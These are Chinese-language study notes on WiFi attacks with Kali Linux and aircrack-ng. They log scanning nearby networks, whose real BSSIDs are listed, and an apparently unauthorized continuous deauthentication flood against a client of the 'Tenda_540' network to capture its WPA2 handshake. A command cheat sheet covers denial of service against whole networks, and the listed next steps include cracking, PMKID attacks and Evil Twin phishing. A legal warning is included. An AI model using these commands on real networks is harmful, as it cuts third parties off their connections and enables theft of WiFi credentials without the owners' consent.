# Kali Linux WiFi 渗透测试学习笔记

## 实验概述

本次实验在 Kali Linux 环境下，使用 **MediaTek mt7921u** 无线网卡，对周边 WiFi 网络进行了扫描、监听和 Deauth 攻击测试，成功捕获了 **Tenda_540** 网络的 WPA2 握手包。

---

## 一、实验环境

| 项目 | 详情 |
|---|---|
| **操作系统** | Kali Linux |
| **无线网卡** | MediaTek mt7921u |
| **网卡接口** | wlan0mon（监听模式） |
| **测试工具** | aircrack-ng 套件 |

---

## 二、工具清单

| 命令 | 用途 |
|---|---|
| `airmon-ng` | 管理无线网卡的监听模式 |
| `airodump-ng` | 扫描和抓取无线网络数据包 |
| `aireplay-ng` | 注入攻击（Deauth 等） |
| `iwconfig` | 查看/设置无线网卡参数 |
| `aircrack-ng` | 破解握手包 |

---

## 三、操作步骤

### 1. 启动监听模式

```bash
# 查看网卡状态
iwconfig

# 启动监听模式
sudo airmon-ng start wlan0

# 确认监听接口已创建
iwconfig wlan0mon
```

**输出示例：**
```
wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz
```

---

### 2. 扫描附近网络

```bash
# 扫描所有 WiFi 网络和连接的设备
airodump-ng wlan0mon
```

**扫描结果解读：**

| 字段 | 含义 |
|---|---|
| **BSSID** | 路由器 MAC 地址 |
| **PWR** | 信号强度（数值越大越好，如 -26 强于 -60） |
| **CH** | 信道 |
| **ENC** | 加密方式（WPA2/WPA3/OPEN） |
| **ESSID** | WiFi 名称 |
| **STATION** | 客户端 MAC 地址 |
| **Lost** | 丢失帧数 |

**本次扫描发现的目标：**

| BSSID | ESSID | 信道 | 加密 | 客户端数 |
|---|---|---|---|---|
| `74:31:AF:9A:13:80` | MGHY.2.4G | 10 | WPA2 | 4 |
| `08:40:F3:7D:95:31` | Tenda_540 | 2 | WPA2 | 1 |
| `24:CF:24:EA:6D:96` | Xiaomi_6D95 | 11 | WPA2 | 0 |
| `1A:2F:A7:6C:4C:97` | ᜊ | 6 | WPA3 | 1 |

---

### 3. 锁定目标信道

**问题：** 网卡当前信道与目标信道不一致会导致攻击失败。

```bash
# 查看当前信道
iwconfig wlan0mon

# 切换到目标信道（以信道2为例）
iwconfig wlan0mon channel 2

# 确认切换
iwconfig wlan0mon
```

**信道与频率对照表：**

| 信道 | 频率 |
|---|---|
| 1 | 2.412 GHz |
| 2 | 2.417 GHz |
| 6 | 2.437 GHz |
| 10 | 2.457 GHz |
| 11 | 2.462 GHz |

---

### 4. 锁定监听目标

```bash
airodump-ng -c 2 --bssid 08:40:F3:7D:95:31 wlan0mon
```

| 参数 | 含义 |
|---|---|
| `-c 2` | 锁定信道 2 |
| `--bssid` | 指定目标路由器 MAC |
| `wlan0mon` | 监听接口 |

---

### 5. 发起 Deauth 攻击

#### 5.1 攻击命令

```bash
# 持续攻击指定客户端
aireplay-ng -0 0 -a 08:40:F3:7D:95:31 wlan0mon -c 5A:9B:A8:55:42:14
```

| 参数 | 含义 |
|---|---|
| `-0` | Deauth 攻击 |
| `0` | 无限循环发送（Ctrl+C 停止） |
| `-a` | 目标路由器 MAC |
| `-c` | 目标客户端 MAC |

#### 5.2 攻击效果

**攻击输出：**
```
Sending 64 directed DeAuth (code 7). STMAC: [5A:9B:A8:55:42:14] [ 8|56 ACKs]
```

`ACKs` 表示客户端确认收到 Deauth 包，数值越大说明攻击效果越好。

#### 5.3 观察攻击效果

在 `airodump-ng` 界面观察：

| 指标 | 攻击前 | 攻击中 |
|---|---|---|
| **Lost** | 45 | **2000** ↑ |
| **Frames** | 57 | **18485** ↑ |
| **Notes** | 无 | **EAPOL**（握手包捕获） |
| **WPA handshake** | 无 | ✅ **已显示** |

---

## 四、常见问题与解决方案

### 问题 1：`No such BSSID available`

**原因：** 网卡信道与目标信道不匹配

**解决：**
```bash
iwconfig wlan0mon channel [目标信道]
```

---

### 问题 2：`Power Management:on`

**原因：** 网卡电源管理开启，可能影响注入稳定性

**尝试关闭：**
```bash
iwconfig wlan0mon power off
```

> **注意：** mt7921u 芯片可能不支持此命令，但不影响 Deauth 攻击。

---

### 问题 3：信道无法切换

**原因：** 多个 `airodump-ng` 进程同时占用网卡

**解决：**
```bash
# 查看所有 airodump 进程
ps aux | grep airodump

# 结束所有进程
pkill airodump-ng

# 重新切换信道
iwconfig wlan0mon channel 11
```

---

### 问题 4：无法定位软件包 mdk3

**原因：** 软件源未更新或配置错误

**解决：**
```bash
# 更新软件源
sudo apt update

# 更换国内镜像源（如阿里云）
echo "deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib" > /etc/apt/sources.list
sudo apt update
sudo apt install mdk3
```

---

## 五、关键概念理解

### Deauth 攻击原理

```
[攻击者] ---- Deauth 包 ----> [客户端]
              ↓
         客户端以为自己断线
              ↓
         尝试重新连接路由器
              ↓
         重连过程中发送握手包
              ↓
         [攻击者捕获握手包]
```

### 攻击参数选择

| 参数 | 效果 | 用途 |
|---|---|---|
| `-0 5` | 发送 5 次后停止 | 抓握手包（推荐） |
| `-0 0` | 持续发送直到手动停止 | 拒绝服务攻击 |
| 不加 `-c` | 攻击所有客户端 | 整个 WiFi 瘫痪 |
| 加 `-c` | 攻击指定客户端 | 单个设备断网 |

---

## 六、安全警告

| 风险 | 说明 |
|---|---|
| ⚠️ **违法行为** | 未经授权攻击他人网络违反《中华人民共和国网络安全法》 |
| ⚠️ **拒绝服务** | Deauth 攻击会导致他人无法上网 |
| ⚠️ **可被检测** | 网络管理员可检测到攻击源 |
| ✅ **合法用途** | 仅用于自有网络安全测试和学习 |

---

## 七、实验总结

### 成功经验

1. **锁定信道是关键**：确保网卡与目标在同一信道
2. **选择活跃目标**：有多个客户端的网络更容易成功
3. **先测试后持续**：先用 `-0 5` 测试，成功后再考虑 `-0 0`
4. **观察 #Data 变化**：数据包增加说明攻击有效

### 本次成果

| 成果 | 详情 |
|---|---|
| ✅ 成功扫描周边网络 | 发现 4+ 个 WiFi 网络 |
| ✅ 成功切换信道 | 从信道 4 切换到信道 2 |
| ✅ 成功发起 Deauth | 攻击输出显示 ACKs 确认 |
| ✅ 捕获 WPA2 握手包 | Tenda_540 的 EAPOL 帧已捕获 |

### 下一步学习方向

1. **破解握手包**：使用 `aircrack-ng` 或 `hashcat` 进行字典攻击
2. **WPA3 破解**：学习 `hcxtools` 和 `hashcat -m 22000`
3. **PMKID 攻击**：无需客户端在线的攻击方式
4. **钓鱼攻击**：Evil Twin 等社会工程学方法

---

## 八、常用命令速查

```bash
# 启动监听
sudo airmon-ng start wlan0

# 关闭监听
sudo airmon-ng stop wlan0mon

# 扫描网络
airodump-ng wlan0mon

# 锁定信道
iwconfig wlan0mon channel [N]

# 锁定目标监听
airodump-ng -c [CH] --bssid [MAC] wlan0mon

# 发送 Deauth（抓握手包）
aireplay-ng -0 5 -a [路由器MAC] wlan0mon -c [客户端MAC]

# 持续 Deauth（拒绝服务）
aireplay-ng -0 0 -a [路由器MAC] wlan0mon

# 注入测试
aireplay-ng --test wlan0mon

# 恢复网络服务
sudo systemctl start NetworkManager
```

---

> **学习日期：** 2026-06-20
> **实验环境：** Kali Linux + MediaTek mt7921u
> **实验目的：** 学习 WiFi 安全测试基本流程，仅用于合法学习用途